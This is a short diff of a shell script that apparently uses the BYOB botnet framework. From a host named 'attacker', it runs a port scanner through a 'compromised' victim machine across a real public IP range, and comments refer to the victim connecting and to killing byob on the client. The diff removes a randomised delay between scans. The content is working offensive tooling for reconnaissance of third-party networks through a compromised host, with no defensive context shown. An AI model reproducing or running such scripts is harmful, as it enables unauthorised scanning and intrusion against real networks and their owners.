@@ -26,7 +26,6 @@ sleep 5 # let the victim connect
 
 for ip in 107.125.{128..254}.{1..254}; do
     ssh attacker "byossh -t 10 compromised portscanner $ip >> /tmp/port-results && cat /tmp/port-results"
-    sleep $(awk -v min=30 -v max=120 'BEGIN{srand(); print min+rand()*(max-min)}')
 done
 
 # Kill byob on client via byob
